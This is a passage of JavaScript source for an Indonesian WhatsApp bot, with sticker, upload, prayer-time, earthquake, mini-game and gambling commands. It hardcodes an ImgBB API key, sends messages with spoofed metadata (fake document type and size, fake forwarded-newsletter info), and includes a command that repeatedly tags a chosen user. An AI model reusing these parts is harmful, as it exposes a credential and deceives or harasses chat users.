 "name": "halo kak ${pushname}",
 "amount": {
 "value": 450510,
 "offset": 1000
 },
 "quantity": ${totalFitur()}
 }
 ]
 },
 "additional_note": "━──────────────────────━\n\n- Button\n- No Enc\n- Free Apikey\n- Free Update SC Forever\n\n━──────────────────────━",
 "native_payment_methods": []
 }`
 }],
 }),
 contextInfo: {
 stanzaId: m.key.id,
 remoteJid: m.isGroup ? m.sender : m.key.remoteJid,
 participant: m.key.participant || m.sender,
 fromMe: m.key.fromMe,
 quotedMessage: m.message,
 },
 }),
 },
 },
 },
 {},
 );

 if (!m.isGroup) return sky.relayMessage(ngentod.key.remoteJid, ngentod.message, {
 messageId: ngentod.key.id,
 });
 
 if (m.isGroup) return sky.relayMessage(m.chat, {
 "requestPaymentMessage": {
 amount: {
 value: 30006610,
 offset: 100,
 currencyCode: 'IDR'
 },
 amount1000: 30006610,
 background: null,
 currencyCodeIso4217: 'IDR',
 expiryTimestamp: 1000000,
 noteMessage: {
 extendedTextMessage: {
 text: '━Gada━',
 }
 },
 requestFrom: m.sender
 }
 }, {});
}
break
case 'wm': {
 if (!m?.quoted) return m?.reply('_reply sticker aelah_');
 
 let stiker = true;
 
 try {
 let textArr = text.split('|');
 let packname = textArr[0].trim();
 let author = textArr.slice(1).join('|').trim();
 
 let mime = m?.quoted.mimetype || '';
 if (!/webp/.test(mime)) throw 'Reply with a sticker!';
 
 let img = await m?.quoted.download();
 if (!img) throw 'Failed to download sticker!';
 
 stiker = await addExif(img, packname || global.packname, author || `Made By: ${pushname}`);
 } catch (e) {
 console.error(e);
 if (Buffer.isBuffer(e)) stiker = e;
 else throw 'An error occurred: ' + e;
 } finally {
 if (stiker) {
 sky.sendFile(m?.chat, stiker, 'sticker.webp', '', m, false, { asSticker: true });
 } else {
 throw 'Conversion failed';
 }
 }
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
 if (/image/.test(mime)) {
 m.reply(mess.wait)
 let media = await sky.downloadMediaMessage(qmsg)
 let encmedia = await sky.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime)) {
 m.reply(mess.wait)
 if (qmsg.seconds > 6) return m.reply('Maksimal 5 detik!')
 let media = await sky.downloadMediaMessage(qmsg)
 let encmedia = await sky.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else {
 m.reply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`)
 }
 }
 break
case 'stickerai': {
 async function addExifAi(buffer, packname, author, categories = [''], extra = {}) {
 const {
 default: {
 Image
 }
 } = await import('node-webpmux');
 
 const img = new Image();
 const json = {
 'sticker-pack-id': 'Natsxe',
 'sticker-pack-name': packname,
 'sticker-pack-publisher': author,
 'emojis': categories,
 'is-ai-sticker': 1,
 ...extra
 };

 let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00]);
 let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8');
 let exif = Buffer.concat([exifAttr, jsonBuffer]);
 exif.writeUIntLE(jsonBuffer.length, 14, 4);
 
 await img.load(buffer);
 img.exif = exif;
 
 return await img.save(null);
 }

 if (!m?.quoted) return m?.reply('Reply with a sticker!');

 let stiker = false;

 try {
 let [packname, ...author] = text.split('|');
 author = (author || []).join('|');
 let mime = m?.quoted.mimetype || '';
 if (!/webp/.test(mime)) throw 'Reply with a sticker!';

 let img = await m?.quoted.download();
 if (!img) throw 'Failed to download sticker!';

 stiker = await addExifAi(img, packname || global.packname, author || global.author);
 } catch (e) {
 console.error(e);
 if (Buffer.isBuffer(e)) stiker = e;
 else throw 'An error occurred: ' + e;
 } finally {
 if (stiker) {
 sky.sendFile(m?.chat, stiker, 'sticker.webp', '', m, false, { asSticker: true });
 } else {
 throw 'Conversion failed';
 }
 }
}
break
case 'tag':{
if (!isPrem) return replyprem(mess.premium)
 if (!isGroup) throw mess.onlygroup;
 const target = args[0]; // User yang ingin ditag
 const amount = parseInt(args[1]); // Jumlah tag yang ingin dikirim
 if (!target || !amount || isNaN(amount) || amount <= 0) {
 throw 'Gunakan: *tag [@user] [jumlah]* (misal: tag @user 3)';
 }

 // Membuat antrian tag untuk pengguna
 tagQueue[sender] = {
 target,
 amount,
 currentIndex: 0
 };

 // Memulai pengiriman tag bergilir
 sendNextTag(sender);
}
 break
case 'infogempa': {
 const getsukina = async () => {
 try {
 const response = await axios.get('https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json');
 const sukiyo = response.data.Infogempa.gempa;
 return sukiyo;
 } catch (error) {
 throw new Error('Gagal mendapatkan data gempa terbaru');
 }
 };

 try {
 const sukina = await getsukina();
 const {
 Tanggal,
 Jam,
 Lintang,
 Bujur,
 Magnitude,
 Kedalaman,
 Wilayah,
 Potensi
 } = sukina;

 const sukija = `Gempa terbaru pada tanggal ${Tanggal}, jam ${Jam} WIB.\n` +
 `Magnitude: ${Magnitude}\n` +
 `Kedalaman: ${Kedalaman}\n` +
 `Lintang: ${Lintang}, Bujur: ${Bujur}\n` +
 `Wilayah: ${Wilayah}\n` +
 `Potensi: ${Potensi}`;

 m.reply(sukija);
 } catch (error) {
 m.reply('Gagal mendapatkan data gempa terbaru.');
 }
}
break
 case 'jadwalsholat': {
 if (!text) {
 throw `Contoh: JadwalSholat Jakarta`;
 }

 m.reply('Mencari jadwal sholat...');

 try {
 const city = encodeURIComponent(text);
 const country = 'ID'; // Asumsikan Indonesia, Anda bisa menyesuaikan dengan negara lain jika perlu
 const url = `https://api.aladhan.com/v1/timingsByCity?city=${city}&country=${country}&method=2`;

 const response = await axios.get(url);
 const data = response.data.data;

 if (!data) {
 throw new Error('Tidak ada jadwal sholat yang ditemukan untuk kota tersebut.');
 }

 const tanggal = new Date(data.date.gregorian.date).toLocaleDateString('id-ID');
 const jadwal = `
Imsak: ${data.timings.Imsak}
Subuh: ${data.timings.Fajr}
Dzuhur: ${data.timings.Dhuhr}
Ashar: ${data.timings.Asr}
Maghrib: ${data.timings.Maghrib}
Isya: ${data.timings.Isha}`;

 m.reply(`Jadwal Sholat untuk kota ${text}:\n\n${jadwal}`);
 } catch (error) {
 m.reply(`Maaf, terjadi kesalahan: ${error.message}`);
 }
}
 break
case 'tourl2': {
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
 m.reply(mess.wait); // Mengirim pesan 'wait' sementara proses berlangsung
 
 // Fungsi untuk mengunggah file ke file.io
 function uploadToFileIO(Path) {
 return new Promise(async (resolve, reject) => {
 if (!fs.existsSync(Path)) return reject(new Error("File not Found"));
 try {
 const form = new FormData();
 form.append("file", fs.createReadStream(Path));
 
 const response = await axios.post("https://file.io", form, {
 headers: form.getHeaders()
 });

 resolve(response.data.link); // Mengembalikan URL file yang diunggah
 } catch (err) {
 reject(new Error(String(err)));
 }
 });
 }

 try {
 // Mengunduh dan menyimpan media dari pesan
 let media = await sky.downloadAndSaveMediaMessage(qmsg);

 // Mengecek apakah tipe media adalah gambar
 if (/image/.test(mime)) {
 let anu = await uploadToFileIO(media);
 m.reply(util.format(anu));
 } else {
 // Jika bukan gambar, tetap mengunggah file
 let anu = await uploadToFileIO(media);
 m.reply(util.format(anu));
 }

 // Menghapus file setelah diunggah
 await fs.unlinkSync(media);
 } catch (err) {
 m.reply(`Error: ${err.message}`);
 }
}
break
case 'tourl3': {
 const axios = require('axios');
 const FormData = require('form-data');
 const fs = require('fs');
 m.reply(mess.wait); // Mengirim pesan 'wait' sementara proses berlangsung

 const apiKey = '06fd47f20c573d4795a47af91f081932'; // Kunci API ImgBB

 // Fungsi untuk mengunggah file ke ImgBB
 async function uploadToImgBB(filePath) {
 try {
 if (!fs.existsSync(filePath)) {
 throw new Error("File not found");
 }

 const form = new FormData();
 form.append('image', fs.createReadStream(filePath));

 const response = await axios.post(`https://api.imgbb.com/1/upload?key=${apiKey}`, form, {
 headers: {
 ...form.getHeaders()
 }
 });

 if (response.status === 200 && response.data.data && response.data.data.url) {
 return response.data.data.url; // Mengembalikan URL gambar yang diunggah
 } else {
 throw new Error(`Upload failed with status: ${response.status}`);
 }
 } catch (err) {
 throw new Error(`Upload failed: ${err.message}`);
 }
 }

 try {
 // Mengunduh dan menyimpan media dari pesan
 let media = await sky.downloadAndSaveMediaMessage(qmsg);

 // Mengecek apakah tipe media adalah gambar
 if (/image/.test(mime)) {
 let url = await uploadToImgBB(media);
 m.reply(`${url}`);
 } else {
 m.reply(`Maaf, hanya gambar yang dapat diunggah.`);
 }

 // Menghapus file setelah diunggah
 await fs.unlinkSync(media);
 } catch (err) {
 m.reply(`Error: ${err.message}`);
 }
}
break
case 'cncase': {
 if (!isCreator) {
 m.reply('Anda tidak memiliki izin untuk mengganti nama case.');
 return;
 }

 const [oldCaseName, newCaseName] = text.split('|').map(item => item.trim());

 if (!oldCaseName || !newCaseName) {
 m.reply('Silakan masukkan nama case lama dan baru dalam format: oldCaseName | newCaseName.');
 return;
 }

 const fs = require('fs');
 const cases = fs.readFileSync('sky.js').toString();
 const caseIndex = cases.indexOf(`case '${oldCaseName}':`);

 if (caseIndex === -1) {
 m.reply(`Case '${oldCaseName}' tidak ditemukan.`);
 return;
 }

 const endIndex = cases.indexOf('break;', caseIndex);

 if (endIndex === -1) {
 m.reply('Terjadi kesalahan dalam menemukan titik "break;" dalam kode.');
 return;
 }

 // Mengganti nama case
 const caseBody = cases.slice(caseIndex, endIndex + 6);
 const newCaseBody = caseBody.replace(`case '${oldCaseName}':`, `case '${newCaseName}':`);

 const updatedCases = cases.slice(0, caseIndex) + newCaseBody + cases.slice(endIndex + 6);
 fs.writeFileSync('sky.js', updatedCases);
 m.reply(`Nama case '${oldCaseName}' berhasil diganti menjadi '${newCaseName}'.`);
}
break
case 'hunting': {
 const user = db.data.users[m.sender];
 const cost = 2000;
 const initialHealth = 100;
 const huntingRewards = {
 goblin: { reward: 1000, chance: 0.6, message: '🗡️ Kamu berhasil mengalahkan Goblin! 🏆' },
 elf: { reward: 1500, chance: 0.3, message: '🗡️ Kamu berhasil mengalahkan Elf! 🏆' },
 demon: { reward: 4000, chance: 0.1, message: '🗡️ Kamu berhasil mengalahkan Iblis! 🏆' },
 demonKing: { reward: 20000, chance: 0.01, message: '🗡️ Kamu berhasil mengalahkan Raja Iblis! 🏆' }
 };

 if (user.balance < cost) {
 m.reply('💸 Balance kamu tidak cukup untuk melakukan hunting.');
 return;
 }

 user.balance -= cost;

 const huntResult = [];
 let userHealth = initialHealth;
 let adventureLog = '';

 for (let i = 0; i < 5; i++) { // Misalkan hunting 5 kali
 const huntRoll = Math.random();
 let hunted = null;

 adventureLog += `🏞️ Perburuan ${i + 1}:\n`;

 // Event acak
 const eventRoll = Math.random();
 if (eventRoll < 0.1) {
 adventureLog += '🔒 Kamu terjebak di perangkap, kehilangan 10 health.\n';
 userHealth -= 10;
 } else if (eventRoll < 0.2) {
 adventureLog += '⛰️ Kamu jatuh ke jurang, kehilangan 20 health.\n';
 userHealth -= 20;
 } else if (eventRoll < 0.3) {
 adventureLog += '🛡️ Kamu bertemu dengan penjaga Raja Iblis, kehilangan 30 health.\n';
 userHealth -= 30;
 } else {
 adventureLog += '🌲 Tidak ada kejadian istimewa.\n';
 }

 if (userHealth <= 0) {
 user.balance -= 1000;
 if (user.balance < 0) user.balance = 0;
 sky.sendMessage(m.chat, {
 image: { url: 'https://telegra.ph/file/cccaf88e449d88a45ffce.jpg' },
 caption: adventureLog + '💀 Kamu mati dalam perburuan, kehilangan 1000 balance dan perburuan berakhir.'
 });
 return;
 }

 if (huntRoll < huntingRewards.demonKing.chance) {
 hunted = 'Raja Iblis';
 adventureLog += huntingRewards.demonKing.message + '\n';
 huntResult.push({ type: hunted, reward: huntingRewards.demonKing.reward });
 } else if (huntRoll < huntingRewards.demonKing.chance + huntingRewards.demon.chance) {
 hunted = 'Iblis';
 adventureLog += huntingRewards.demon.message + '\n';
 huntResult.push({ type: hunted, reward: huntingRewards.demon.reward });
 } else if (huntRoll < huntingRewards.demonKing.chance + huntingRewards.demon.chance + huntingRewards.elf.chance) {
 hunted = 'Elf';
 adventureLog += huntingRewards.elf.message + '\n';
 huntResult.push({ type: hunted, reward: huntingRewards.elf.reward });
 } else if (huntRoll < huntingRewards.demonKing.chance + huntingRewards.demon.chance + huntingRewards.elf.chance + huntingRewards.goblin.chance) {
 hunted = 'Goblin';
 adventureLog += huntingRewards.goblin.message + '\n';
 huntResult.push({ type: hunted, reward: huntingRewards.goblin.reward });
 } else {
 hunted = 'None';
 adventureLog += '🔍 Kamu tidak menemukan apapun.\n';
 huntResult.push({ type: hunted, reward: 0 });
 }

 if (hunted !== 'None') {
 const damage = Math.floor(Math.random() * 20) + 1; // Kurangi health secara acak antara 1 sampai 20
 userHealth -= damage;
 adventureLog += `⚔️ Kamu menerima ${damage} damage. Sisa health: ${userHealth}\n`;
 if (userHealth <= 0) {
 user.balance -= 1000;
 if (user.balance < 0) user.balance = 0;
 sky.sendMessage(m.chat, {
 image: { url: 'https://telegra.ph/file/cccaf88e449d88a45ffce.jpg' },
 caption: adventureLog + '💀 Kamu mati dalam perburuan, kehilangan 1000 balance dan perburuan berakhir.'
 });
 return;
 }
 }

 adventureLog += '\n';
 }

 let totalReward = huntResult.reduce((acc, hunt) => acc + hunt.reward, 0);
 user.balance += totalReward;

 let resultText = '📜 Hasil Hunting:\n';
 huntResult.forEach((hunt, index) => {
 resultText += `Hunt ${index + 1}: ${hunt.type}, Reward: ${hunt.reward}\n`;
 });
 resultText += `💰 Total Reward: ${totalReward}\n`;
 resultText += `❤️ Sisa Health: ${userHealth}\n`;

 sky.sendMessage(m.chat, {
 image: { url: 'https://telegra.ph/file/cccaf88e449d88a45ffce.jpg' },
 caption: adventureLog + resultText
 });
}
break
case 'exploration': {
 if (!isCreator) return m.reply(mess.owner);

 const user = db.data.users[m.sender];
 const cost = 1500;
 const initialHealth = 100;

 if (user.balance < cost) {
 m.reply('💸 Balance kamu tidak cukup untuk melakukan eksplorasi.');
 return;
 }

 user.balance -= cost;

 const explorationEvents = [
 { message: '🌲 Kamu menemukan hutan yang lebat.', damage: 0 },
 { message: '🌊 Kamu menemukan sungai yang deras.', damage: 0 },
 { message: '🏞️ Kamu menemukan jurang yang dalam, kamu jatuh dan kehilangan 10 health.', damage: 10 },
 { message: '🔥 Kamu menemukan kebakaran hutan, kehilangan 20 health.', damage: 20 },
 { message: '🐻 Kamu diserang beruang liar, kehilangan 30 health.', damage: 30 },
 { message: '💎 Kamu menemukan gua berisi harta karun, mendapatkan 5000 balance!', damage: 0, reward: 5000 }
 ];

 let adventureLog = '';
 let userHealth = initialHealth;
 let totalReward = 0;

 for (let i = 0; i < 5; i++) { // Misalkan eksplorasi 5 kali
 const event = explorationEvents[Math.floor(Math.random() * explorationEvents.length)];
 adventureLog += `Eksplorasi ${i + 1}: ${event.message}\n`;

 if (event.damage) {
 userHealth -= event.damage;
 if (userHealth <= 0) {
 user.balance -= 1000;
 if (user.balance < 0) user.balance = 0;
 sky.sendMessage(m.chat, {
 image: { url: 'https://telegra.ph/file/cccaf88e449d88a45ffce.jpg' },
 caption: adventureLog + '💀 Kamu mati dalam eksplorasi, kehilangan 1000 balance dan eksplorasi berakhir.'
 });
 return;
 }
 }

 if (event.reward) {
 totalReward += event.reward;
 }
 }

 user.balance += totalReward;

 let resultText = `📜 Hasil Eksplorasi:\nTotal Reward: ${totalReward}\n❤️ Sisa Health: ${userHealth}\n`;
 sky.sendMessage(m.chat, {
 image: { url: 'https://telegra.ph/file/cccaf88e449d88a45ffce.jpg' },
 caption: adventureLog + resultText
 });
}
break
case 'treasurehunt': {
 const user = db.data.users[m.sender];
 const cost = 2500;
 const initialHealth = 100;

 if (user.balance < cost) {
 m.reply('💸 Balance kamu tidak cukup untuk melakukan perburuan harta karun.');
 return;
 }

 user.balance -= cost;

 const treasureEvents = [
 { message: '🏝️ Kamu menemukan pulau terpencil.', damage: 0 },
 { message: '🗺️ Kamu menemukan peta harta karun.', damage: 0 },
 { message: '💀 Kamu terjebak dalam jebakan, kehilangan 10 health.', damage: 10 },
 { message: '🐍 Kamu diserang ular berbisa, kehilangan 20 health.', damage: 20 },
 { message: '🏰 Kamu menemukan kastil yang ditinggalkan, mendapatkan 3000 balance!', damage: 0, reward: 3000 },
 { message: '💰 Kamu menemukan peti harta karun, mendapatkan 10000 balance!', damage: 0, reward: 10000 }
 ];

 let adventureLog = '';
 let userHealth = initialHealth;
 let totalReward = 0;

 for (let i = 0; i < 5; i++) { // Misalkan perburuan harta karun 5 kali
 const event = treasureEvents[Math.floor(Math.random() * treasureEvents.length)];
 adventureLog += `Perburuan ${i + 1}: ${event.message}\n`;

 if (event.damage) {
 userHealth -= event.damage;
 if (userHealth <= 0) {
 user.balance -= 1000;
 if (user.balance < 0) user.balance = 0;
 sky.sendMessage(m.chat, {
 image: { url: 'https://telegra.ph/file/47e6b2d4f0cce5a0d83f9.jpg' }, // Image URL
 caption: adventureLog + '💀 Kamu mati dalam perburuan, kehilangan 1000 balance dan perburuan berakhir.'
 });
 return;
 }
 }

 if (event.reward) {
 totalReward += event.reward;
 }
 }

 user.balance += totalReward;

 let resultText = `📜 Hasil Perburuan Harta Karun:\nTotal Reward: ${totalReward}\n❤️ Sisa Health: ${userHealth}\n`;
 sky.sendMessage(m.chat, {
 image: { url: 'https://telegra.ph/file/eca1ff7df36e792a05c22.jpg' }, // Image URL
 caption: adventureLog + resultText
 });
}
break
case 'dungeoncrawl': {
 if (!isCreator) return m.reply(mess.owner);

 const user = db.data.users[m.sender];
 const cost = 3000;
 const initialHealth = 100;

 if (user.balance < cost) {
 m.reply('💸 Balance kamu tidak cukup untuk melakukan penjelajahan dungeon.');
 return;
 }

 user.balance -= cost;

 const dungeonEvents = [
 { message: '🧙 Kamu menemukan penyihir yang baik, mendapatkan ramuan kesehatan, menambah 10 health.', health: 10 },
 { message: '⚔️ Kamu bertarung dengan goblin, kehilangan 15 health.', damage: 15 },
 { message: '🔥 Kamu terkena jebakan api, kehilangan 20 health.', damage: 20 },
 { message: '💎 Kamu menemukan harta karun, mendapatkan 5000 balance!', reward: 5000 },
 { message: '👻 Kamu bertemu hantu, kehilangan 30 health.', damage: 30 },
 { message: '🔮 Kamu menemukan artefak ajaib, mendapatkan 8000 balance!', reward: 8000 }
 ];

 let adventureLog = '';
 let userHealth = initialHealth;
 let totalReward = 0;

 for (let i = 0; i < 5; i++) { // Misalkan penjelajahan dungeon 5 kali
 const event = dungeonEvents[Math.floor(Math.random() * dungeonEvents.length)];
 adventureLog += `Penjelajahan ${i + 1}: ${event.message}\n`;

 if (event.damage) {
 userHealth -= event.damage;
 if (userHealth <= 0) {
 user.balance -= 1000;
 if (user.balance < 0) user.balance = 0;
 sky.sendMessage(m.chat, {
 image: { url: 'https://telegra.ph/file/502d2f6b9676b42e5c20d.jpg' }, // Image URL
 caption: adventureLog + '💀 Kamu mati dalam penjelajahan, kehilangan 1000 balance dan penjelajahan berakhir.'
 });
 return;
 }
 }

 if (event.health) {
 userHealth += event.health;
 }

 if (event.reward) {
 totalReward += event.reward;
 }
 }

 user.balance += totalReward;

 let resultText = `📜 Hasil Penjelajahan Dungeon:\nTotal Reward: ${totalReward}\n❤️ Sisa Health: ${userHealth}\n`;
 sky.sendMessage(m.chat, {
 image: { url: 'https://telegra.ph/file/05551e82d0cf62dc86bf0.jpg' }, // Image URL
 caption: adventureLog + resultText
 });
}
break
case 'menufun': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
    let docs = fs.readFileSync('./src/sky.ppt');  // Menggunakan titik koma
    let listfakedocs = [
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'application/vnd.openxmlformats-officedocument.presentationml.presentation',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'application/pdf'
    ];
    // Fungsi getPp untuk mengambil gambar profil
    async function getPp(sky, target) {
        try {
            const response = await sky.query({
                tag: "iq",
                attrs: {
                    target: target,
                    to: "@s.whatsapp.net",
                    type: "get",
                    xmlns: "w:profile:picture"
                },
                content: [{
                    tag: "picture",
                    attrs: {
                        type: "image",
                        query: "url"
                    }
                }]
            });
            return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        } catch (error) {
            console.error('Error fetching profile picture:', error);
            return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        }
    }

    // Ambil profile picture menggunakan getPp
    let profile = await getPp(sky, m.sender);

    const menunya = `≫ MENU FUN

> ADUALIEN
> ADUAYAM
> ADUBALAPAN
> ADUBERANTEM
> ADUBERTARUNG
> ADUMASAK
> ADUPAHLWAN
> ADULAYANGAN
> ADVENTURE
> APAKAH
> BALAPAN
> BAGAIMANAKAH
> BINGO
> BLACKJACK
> BOXING
> BUYLIMIT
> CANCELAKINATOR
> CANTIKCEK
> CASINO
> CEKINFO
> CEKGANTENG
> CEKGAY
> CEKLESBI
> CEKMATI
> CEKSANGE
> CEKCANTIK
> DARE
> DELTTT
> DICEGAMBLE
> DOKTER
> DUNGEONCRAWL
> EXPLANATION
> FAMILY100
> GAMEHANTU
> GANTENGCEK
> GAYCEK
> HALAH
> HELEH
> HILIH
> HOLOH
> HULUH
> HUNTING
> IKY
> IMPOSTORAKHIRI
> IMPOSTORCEK
> IMPOSTORMULAI
> JADIAN
> JODOHKU
> KALAHKANMONSTER
> KAPANKAH
> LIMIT
> MANCING
> MATH
> MEMBANGUNRUMAH
> MENANAMUBI
> MYSTERY
> PICK
> PETUALANGANEPIC
> POKER
> PRICE
> QUOTE
> RATE
> RATE1
> ROULETTE
> SANGECEK
> SHOP
> SIMIH
> SKOR
> SLOTMACHINE
> SOUND
> SUITBOT
> SUITPVP
> TEBAK
> TEBAKK
> TEBAKMULAI
> TEBAKAKHIRI
> TEPUK
> TEPUKGAME
> TREASUREHUNT
> TRUTH
> TICTACTOE
> TFLIMIT
> TFBALANCE
> LIMIT
> QQ
> ADUHEWAN
> ADUMASAK
> HUNTING
> DOKTER`
    await sky.sendMessage(m.chat, {
        document: docs,
        fileName: `Hai Kak ${pushname}`,
        mimetype: pickRandom(listfakedocs),
        fileLength: 100000000000,  // Sesuaikan dengan ukuran file yang lebih realistis
        pageCount: 999,  // Sesuaikan dengan dokumen yang dikirim
        caption: menunya,
        contextInfo: {
            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            forwardingScore: 10,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '0@newsletter',
                serverMessageId: null,
                newsletterName: 'Hello Everyone My name is Avosky'
            },
            externalAdReply: {
                title: `${hariini} ⏲️`,
                body: `${runtime(uptime)}`,
                showAdAttribution: true,
                thumbnailUrl: profile,  // Menggunakan profil yang didapat dari getPp
                mediaType: 1,
                previewType: 0,
                renderLargerThumbnail: true,
                mediaUrl: 'https://avosky.com',
                sourceUrl: 'https://avosky.com'
            }
        }
    }, { quoted: fkontak });
}
break;
case 'pin': {
 if (!text) {
 m.reply('Mohon masukkan kata kunci yang ingin dicari di Pinterest.');
 return;
 }

 m.reply(mess.wait);
 pinterest(text.toLowerCase())
 .then((result) => {
 if (result.status === 200 && result.result.length > 0) {
 let imageUrl = result.result[Math.floor(Math.random() * result.result.length)];
 sky.sendMessage(m.chat, { image: { url: imageUrl }, caption: mess.done }, { quoted: m });
 } else {
 m.reply('Tidak dapat menemukan gambar untuk kata kunci ini.');
 }
 })
 .catch((error) => {
 console.error(error);
 m.reply('Terjadi kesalahan dalam mencari gambar.');
 });
}
 break
 case 'slot': {
 const inputBet = parseInt(args[0]);

 if (isNaN(inputBet) || inputBet <= 0) {
 return m.reply('Masukkan jumlah taruhan yang valid (angka positif).');
 }

 const userBalance = db.data.users[m.sender].balance;

 if (userBalance < inputBet) {
 return m.reply('Maaf, saldo Anda tidak mencukupi untuk memainkan slot ini.');
 }

 const betAmount = inputBet;
 const symbols = ['🍌', '🍉', '🍇', '🍊'];
 const jackpotMultiplier = 5;

 const slotResults = [];
 for (let i = 0; i < 3; i++) {
 const randomIndex = Math.floor(Math.random() * symbols.length);
 slotResults.push(symbols[randomIndex]);
 }

 const slotDisplay = `
╭─────༺♡༻──────╮
 ${slotResults[0]} || ${slotResults[1]} || ${slotResults[2]}
╰─────༺♡༻──────╯`;
 let winMultiplier = 0;
 let resultMessage = '';

 if (slotResults[0] === slotResults[1] && slotResults[1] === slotResults[2]) {
 winMultiplier = jackpotMultiplier;
 resultMessage = '🎉 Anda Mendapat Jackpot!';
 } else if (slotResults[0] === slotResults[1] || slotResults[1] === slotResults[2] || slotResults[0] === slotResults[2]) {
 winMultiplier = 2;
 resultMessage = '🎉 Anda Menang!';
 } else {
 resultMessage = '😔 Anda Kalah!';
 }

 const winnings = betAmount * winMultiplier;

 if (winnings > 0) {
 db.data.users[m.sender].balance += winnings - betAmount;
 resultMessage += ` Anda mendapatkan ${winnings.toLocaleString()}!`;
 } else {
 db.data.users[m.sender].balance -= betAmount;
 resultMessage += ` Anda kehilangan ${betAmount.toLocaleString()}.`;
 }

 const balanceMessage = `Saldo Anda sekarang ${db.data.users[m.sender].balance.toLocaleString()}.`;

 const replyMessage = `🎰 Hasil Slot: \n${slotDisplay}\n\n${resultMessage} ${balanceMessage}`;

 return m.reply(replyMessage);
}
break
case 'text': {
 if (!text) throw `apa`
if (m.isGroup) {
sky.sendMessage(m.chat, {text: '@'+m.chat, contextInfo: {
groupMentions: [
{
groupSubject: `${q}`,
groupJid: m.chat
}]
}
}, {quoted: m})
} else {
await m.reply(m.chat, `${q}`, m)
}
}
break
case'totalfitur': case 'fitur':{ 
 m.reply(`𝙰𝚅𝙾𝚂𝙺𝚈-𝙼𝙳 𝙷𝙰𝚅𝙴 𝙰 ${totalFitur()} 𝙵𝙴𝙰𝚃𝚄𝚁𝙴`)
}
 break
case 'aidiff': {
 if (!isPrem) return replyprem(mess.premium)
 if (!q) return m.reply(`_Where's The Query ? Man_`)
 const axios = require('axios');
 async function avz(prompt) {
 try {
 return await new Promise(async (resolve, reject) => {
 if (!prompt) return reject("failed reading undefined prompt!");
 axios.post("https://aiimagegenerator.io/api/model/predict-peach", {
 prompt,
 negativePrompt: "uncensored, hd, sexy",
 key: `Anime`,
 width: 1024,
 height: 1024,
 quantity: 1,
 size: "512x768"
 }).then(res => {
 const data = res.data;
 if (data.code !== 0) return reject(data.message);
 if (data.data.safetyState === "RISKY") return reject("nsfw image was generated, you try create other image again!");
 if (!data.data?.url) return reject("failed generating image!");
 return resolve({
 status: true,
 image: data.data.url
 });
 }).catch(reject);
 });
 } catch (e) {
 return {
 status: false,
 message: e
 };
 }
 }
 avz(`${q}`).then(result => {
 if (result.status && result.image) { 
 sky.sendMessage(m.chat, { image: { url: result.image } }, { caption: `> ${q}` });
 } else {
 m.reply('Gagal membuat gambar: ' + (result.message || 'Tidak diketahui.'));
 }
 }).catch(error => {
 m.reply('Terjadi kesalahan: ' + error);
 });
}
break
case 'setppbot': case 'setpppanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await sky.downloadAndSaveMediaMessage(quoted)
			let botNumber = await sky.decodeJid(sky.user.id)
			let { img } = await pepe(media)
			await sky.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			m.reply(`Sukses mengganti PP Bot`)
		} catch (e) {
			console.log(e)
			m.reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		m.reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
case 'get1': {
 if (!isCreator) return m.reply('Fitur Khusus Owner') 

 let cloudscraper = require('cloudscraper'); // Menggunakan cloudscraper
 let util = require('util');
 
 // Pastikan URL dimulai dengan http:// atau https://
 if (!/^https?:\/\//.test(text)) return m.reply('Awali *URL* dengan http:// atau https://');
 
 let _url = new URL(text);
 
 // Menggunakan cloudscraper untuk melakukan request ke URL
 cloudscraper.get(text, async (error, response, body) => {
 if (error) {
 return m.reply(`Gagal melakukan request: ${error.message}`);
 }
 
 // Mengecek ukuran konten
 if (response.headers['content-length'] && parseInt(response.headers['content-length']) > 100 * 1024 * 1024) {
 return m.reply(`Content-Length: ${response.headers['content-length']}`);
 }
 
 // Mengecek jenis konten, hanya file teks atau JSON yang diproses
 if (!/text|json/.test(response.headers['content-type'])) {
 return sky.sendFile(m.chat, _url, null, text, m);
 }
 
 let txt = body; // Mengambil body dari response

 try {
 txt = util.format(JSON.parse(txt)); // Format JSON jika memungkinkan
 } catch (e) {
 txt = txt; // Tetap pakai teks asli jika parsing gagal
 } finally {
 // Mengirim balasan, maksimal 65.536 karakter
 m.reply(txt.slice(0, 65536) + '');
 }
 });
}
break;



case 'tovid': {
const axios = require('axios')
const former = require('form-data')
